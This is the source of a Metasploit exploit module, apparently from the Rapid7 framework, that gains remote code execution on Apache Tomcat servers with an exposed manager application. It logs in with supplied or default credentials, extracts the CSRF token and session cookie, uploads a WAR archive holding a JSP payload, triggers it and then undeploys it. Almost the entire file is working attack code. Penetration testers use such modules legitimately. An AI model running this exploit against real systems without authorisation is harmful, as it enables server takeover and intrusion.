# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Apache.*(Coyote|Tomcat)/ ] }

  CSRF_VAR = &#039;CSRF_NONCE=&#039;

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Apache Tomcat Manager Application Upload Authenticated Code Execution&#039;,
      &#039;Description&#039; => %q{
        This module can be used to execute a payload on Apache Tomcat servers that
        have an exposed "manager" application. The payload is uploaded as a WAR archive
        containing a jsp application using a POST request against the /manager/html/upload
        component.

        NOTE: The compatible payload sets vary based on the selected target. For
        example, you must select the Windows target to use native Windows payloads.
      },
      &#039;Author&#039;      => &#039;rangercha&#039;,
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          # This is based on jduck&#039;s tomcat_mgr_deploy.
          # the tomcat_mgr_deploy o longer works for current versions of tomcat due to
          # CSRF protection tokens. Also PUT requests against the /manager/html/deploy
          # aren&#039;t allowed anymore.

          # There is no single vulnerability associated with deployment functionality.
          # Instead, the focus has been on insecure/blank/hardcoded default passwords.

          #  The following references refer to HP Operations Manager
          [&#039;CVE&#039;, &#039;2009-3843&#039;],
          [&#039;OSVDB&#039;, &#039;60317&#039;],
          [&#039;CVE&#039;, &#039;2009-4189&#039;],
          [&#039;OSVDB&#039;, &#039;60670&#039;],

          # HP Operations Dashboard
          [&#039;CVE&#039;, &#039;2009-4188&#039;],

          [&#039;BID&#039;, &#039;38084&#039;],
          [&#039;CVE&#039;, &#039;2010-0557&#039;],
          [&#039;URL&#039;, &#039;http://www-01.ibm.com/support/docview.wss?uid=swg21419179&#039;],

          # IBM Rational Quality Manager and Test Lab Manager
          [&#039;CVE&#039;, &#039;2010-4094&#039;],
          [&#039;ZDI&#039;, &#039;10-214&#039;],

          # &#039;admin&#039; password is blank in default Windows installer
          [&#039;CVE&#039;, &#039;2009-3548&#039;],
          [&#039;OSVDB&#039;, &#039;60176&#039;],
          [&#039;BID&#039;, &#039;36954&#039;],

          # tomcat docs
          [&#039;URL&#039;, &#039;http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html&#039;]
        ],
      &#039;Platform&#039;    => %w{ java linux win }, # others?
      &#039;Targets&#039;     =>
        [
          [ &#039;Java Universal&#039;,
            {
              &#039;Arch&#039;     => ARCH_JAVA,
              &#039;Platform&#039; => &#039;java&#039;
            }
          ],
          #
          # Platform specific targets only
          #
          [ &#039;Windows Universal&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [ &#039;Linux x86&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 09 2009&#039;))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [false, &#039;The username to authenticate as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [false, &#039;The password for the specified username&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, "The URI path of the manager app (/html/upload and /undeploy will be used)", &#039;/manager&#039;])
      ], self.class)
  end

  def check
    res = query_manager
    disconnect

    return CheckCode::Unknown if res.nil?

    if res.code.between?(400, 499)
      vprint_error("#{peer} - Server rejected the credentials")
      return CheckCode::Unknown
    end

    return CheckCode::Safe unless res.code == 200

    # if res.code == 200
    #   there should be access to the Tomcat Manager and to the status page
    res = query_status
    return CheckCode::Unknown unless res

    plat = detect_platform(res.body)
    arch = detect_arch(res.body)
    return CheckCode::Unknown unless plat and arch

    vprint_status("#{peer} - Tomcat Manager found running on #{plat} platform and #{arch} architecture")

    report_auth_info(
      :host   => rhost,
      :port   => rport,
      :sname  => (ssl ? "https" : "http"),
      :user   => datastore[&#039;USERNAME&#039;],
      :pass   => datastore[&#039;PASSWORD&#039;],
      :proof  => "WEBAPP=\"Tomcat Manager App\", VHOST=#{vhost}, PATH=#{datastore[&#039;PATH&#039;]}",
      :active => true
    )

    return CheckCode::Appears
  end

  def exploit
    @app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    @jsp_name = rand_text_alphanumeric(4 + rand(32 - 4))

    #
    # Find the session ID and the CSRF token
    #
    print_status("#{peer} - Retrieving session ID and CSRF token...")
    unless access_manager?
      fail_with(Failure::Unknown, "Unable to access the Tomcat Manager")
    end

    #
    # Upload Payload
    #
    print_status("#{peer} - Uploading and deploying #{@app_base}...")
    if upload_payload
      report_auth_info(
        :host   => rhost,
        :port   => rport,
        :sname  => (ssl ? "https" : "http"),
        :user   => datastore[&#039;USERNAME&#039;],
        :pass   => datastore[&#039;PASSWORD&#039;],
        :proof  => "WEBAPP=\"Tomcat Manager App\", VHOST=#{vhost}, PATH=#{datastore[&#039;PATH&#039;]}",
        :active => true
      )
    else
      fail_with(Failure::Unknown, "Upload failed")
    end

    #
    # Execute Payload
    #
    print_status("#{peer} - Executing #{@app_base}...")
    unless execute_payload
      fail_with(Failure::Unknown, "Failed to execute the payload")
    end

    #
    # Get the new CSRF token & session id
    #
    unless access_manager?
      fail_with(Failure::Unknown, "Unable to access the Tomcat Manager")
    end

    #
    # Delete the deployed payload
    #
    print_status("#{peer} - Undeploying #{@app_base} ...")
    unless undeploy_app
      print_warning("#{peer} - Failed to undeploy #{@app_base}...")
    end
  end

  def query_status
    path = normalize_uri(target_uri.path.to_s, &#039;status&#039;)
    res = send_request_raw(&#039;uri&#039; => path)

    unless res and res.code == 200
      vprint_error("Failed: Error requesting #{path}")
      return nil
    end

    return res
  end

  def query_manager
    path = normalize_uri(target_uri.path.to_s, &#039;/html&#039;)
    res = send_request_raw(&#039;uri&#039; => path)

    return res
  end

  def vars_get
    vars = {}
    unless @csrf_token.nil?
      vars = {
        "path" => @app_base,
        "org.apache.catalina.filters.CSRF_NONCE" => @csrf_token
      }
    end

    return vars
  end

  def detect_platform(body)
    return nil if body.blank?

    i=0

    body.each_line do |ln|
      ln.chomp!

      i = 1 if ln =~ /OS Name/

      if i == 9 or i == 11
        if ln.include? "Windows"
          return &#039;win&#039;
        elsif ln.include? "Linux"
          return &#039;linux&#039;
        elsif i==11
          return &#039;unknown&#039;
        end
      end

      i = i+1 if i > 0
    end
  end

  def detect_arch(body)
    return nil if body.blank?

    i=0
    body.each_line do |ln|
      ln.chomp!

      i = 1 if ln =~ /OS Architecture/

      if i==9 or i==11
        if ln.include? &#039;x86&#039;
          return ARCH_X86
        elsif ln.include? &#039;i386&#039;
          return ARCH_X86
        elsif ln.include? &#039;i686&#039;
          return ARCH_X86
        elsif ln.include? &#039;x86_64&#039;
          return ARCH_X86
        elsif ln.include? &#039;amd64&#039;
          return ARCH_X86
        elsif i==11
          return &#039;unknown&#039;
        end
      end

      i = i + 1 if i > 0
    end
  end

  def find_csrf(res = nil)
    return "" if res.blank?

    vprint_status("#{peer} - Finding CSRF token...")

    body = res.body

    body.each_line do |ln|
      ln.chomp!
      csrf_nonce = ln.index(CSRF_VAR)
      next if csrf_nonce.nil?
      token = ln[csrf_nonce + CSRF_VAR.length, 32]
      return token
    end

    return ""
  end

  def generate_multipart_msg(boundary, data)
    # Rex::MIME::Message is breaking the binary upload when trying to
    # enforce CRLF for SMTP compatibility
    war_multipart = "-----------------------------"
    war_multipart << boundary
    war_multipart << "\r\nContent-Disposition: form-data; name=\"deployWar\"; filename=\""
    war_multipart << @app_base
    war_multipart << ".war\"\r\nContent-Type: application/octet-stream\r\n\r\n"
    war_multipart << data
    war_multipart << "\r\n-----------------------------"
    war_multipart << boundary
    war_multipart << "--\r\n"
  end

  def war_payload
    payload.encoded_war({
      :app_name => @app_base,
      :jsp_name => @jsp_name,
      :arch => target.arch,
      :platform => target.platform
    }).to_s
  end

  def send_war_payload(url, war)
    boundary_identifier = rand_text_numeric(28)

    res = send_request_cgi({
      &#039;uri&#039;          => url,
      &#039;method&#039;       => &#039;POST&#039;,
      &#039;ctype&#039;        => &#039;multipart/form-data; boundary=---------------------------&#039; + boundary_identifier,
      &#039;user&#039;         => datastore[&#039;USERNAME&#039;],
      &#039;password&#039;     => datastore[&#039;PASSWORD&#039;],
      &#039;cookie&#039;       => @session_id,
      &#039;vars_get&#039;     => vars_get,
      &#039;data&#039;         => generate_multipart_msg(boundary_identifier, war),
    })

    return res
  end

  def send_request_undeploy(url)
    res = send_request_cgi({
      &#039;uri&#039;          => url,
      &#039;vars_get&#039;     => vars_get,
      &#039;method&#039;       => &#039;POST&#039;,
      &#039;user&#039;         => datastore[&#039;USERNAME&#039;],
      &#039;password&#039;     => datastore[&#039;PASSWORD&#039;],
      &#039;cookie&#039;       => @session_id
    })

    return res
  end

  def access_manager?
    res = query_manager
    return false unless res and res.code == 200
    @session_id = res.get_cookies
    @csrf_token = find_csrf(res)
    return true
  end

  def upload_payload
    war = war_payload
    upload_path = normalize_uri(target_uri.path.to_s, "html", "upload")
    vprint_status("#{peer} - Uploading #{war.length} bytes as #{@app_base}.war ...")
    res = send_war_payload(upload_path, war)
    return parse_upload_response(res)
  end

  def parse_upload_response(res)
    unless res
      vprint_error("#{peer} - Upload failed on #{upload_path} [No Response]")
      return false
    end

    if res.code < 200 or res.code >= 300
      vprint_warning("Warning: The web site asked for authentication: #{res.headers[&#039;WWW-Authenticate&#039;] || res.headers[&#039;Authentication&#039;]}") if res.code == 401
      vprint_error("Upload failed on #{upload_path} [#{res.code} #{res.message}]")
      return false
    end

    return true
  end

  def execute_payload
    jsp_path = normalize_uri(@app_base, "#{@jsp_name}.jsp")

    vprint_status("#{peer} - Executing #{jsp_path}...")

    res = send_request_cgi({
      &#039;uri&#039;          => jsp_path,
      &#039;method&#039;       => &#039;GET&#039;
    })

    return parse_execute_response(res)
  end

  def parse_execute_response(res)
    unless res
      vprint_error("#{peer} - Execution failed on #{@app_base} [No Response]")
      return false
    end

    if res and (res.code < 200 or res.code >= 300)
      vprint_error("#{peer} - Execution failed on #{@app_base} [#{res.code} #{res.message}]")
      return false
    end

    return true
  end

  def undeploy_app
    undeploy_url = normalize_uri(target_uri.path.to_s, "html", "undeploy")
    res = send_request_undeploy(undeploy_url)

    unless res
      vprint_warning("#{peer} - WARNING: Undeployment failed on #{undeploy_url} [No Response]")
      return false
    end

    if res and (res.code < 200 or res.code >= 300)
      vprint_warning("#{peer} - Deletion failed on #{undeploy_url} [#{res.code} #{res.message}]")
      return false
    end

    return true
  end

end

